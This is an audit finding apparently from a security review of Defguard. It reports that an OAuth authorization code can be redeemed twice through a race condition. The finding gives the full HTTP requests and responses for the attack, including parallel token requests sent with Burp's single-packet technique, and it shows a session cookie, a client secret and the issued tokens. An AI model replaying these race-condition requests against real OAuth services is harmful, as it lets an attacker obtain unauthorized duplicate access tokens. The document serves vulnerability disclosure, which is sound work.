---
title: "DG25-24: RFC 6749 violation - code can be used more than once due to race condition"
cvss_score:
severity: Info
cvss_string: "/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:N"
issue_link: https://github.com/DefGuard/defguard/issues/1550
---

### Technical details

1.  Generate code:

**Request:**\
\
**GET**
/api/v1/oauth/authorize?scope=profile&response_type=code&client_id=9szvHNlxY6R3jvbX&redirect_uri=https%3A%2F%2Fisec.pl&state=1&nonce=1&allow=true
HTTP/2\
**Host:** defguard.dvpnsec.net\
**Cookie:** defguard_session=q4HT5ItlifpmV4rDDUcXZVWU\
\
\
**Response:**\
\
**HTTP/2** 302 Found\
**Alt-Svc:** h3=\":443\"; ma=2592000\
**Date:** Tue, 12 Aug 2025 10:33:29 GMT\
**Location:** `https://isec.pl/?code=tPwLxI4iYqGUFSxclZUwOZ0d&state=1`\
**Server:** Caddy\
**Content-Length:** 0

1.  Send below requests into Burp\'s Repeater twice. Group Repeater\'s
    tabs into single group and Send group in parallel (single-packet
    attack).

**Request:**\
\
**POST** /api/v1/oauth/token HTTP/2\
**Host:** defguard.dvpnsec.net\
**Content-Length:** 165\
**Content-Type:** application/x-www-form-urlencoded\
\
`grant_type=authorization_code&redirect_uri=https://isec.pl&code=tPwLxI4iYqGUFSxclZUwOZ0d&client_id=9szvHNlxY6R3jvbX&client_secret=SHyMugRCmiTkLdo1xtV5IwgrY1dKoHpN&`\
\
\
**Response:**\
\
**HTTP/2** 200 OK\
**Alt-Svc:** h3=\":443\"; ma=2592000\
**Content-Type:** application/json\
**Date:** Tue, 12 Aug 2025 10:33:36 GMT\
**Server:** Caddy\
**X-Defguard-Version:** 1.5.0-a29ac10\
**Content-Length:** 124\


```json
{
"access_token ": "c4SyMSrsSPYjT7OqylFsHMDZ ",
"id_token ":null, 
"refresh_token ": "Io0N0HKAOS98lepMvHqt3duh ", 
"token_type ": "bearer "
}
```

**Request:**\
\
**POST** /api/v1/oauth/token HTTP/2\
**Host:** defguard.dvpnsec.net\
**Content-Length:** 165\
**Content-Type:** application/x-www-form-urlencoded\
\
`grant_type=authorization_code&redirect_uri=https://isec.pl&code=tPwLxI4iYqGUFSxclZUwOZ0d&client_id=9szvHNlxY6R3jvbX&client_secret=SHyMugRCmiTkLdo1xtV5IwgrY1dKoHpN&`\
\
\
**Response:**\
\
**HTTP/2** 200 OK\
**Alt-Svc:** h3=\":443\"; ma=2592000\
**Content-Type:** application/json\
**Date:** Tue, 12 Aug 2025 10:33:36 GMT\
**Server:** Caddy\
**X-Defguard-Version:** 1.5.0-a29ac10\
**Content-Length:** 124\

```json
{ 
"access_token ": "YUd8GGDbXJQZr9V4ebYxqx8Q ", 
"id_token ":null,
"refresh_token ": "04h4wum40uw0Uc1zELYRSby6 ",
"token_type ": "bearer"
}
```
The same code generated two different access tokens.
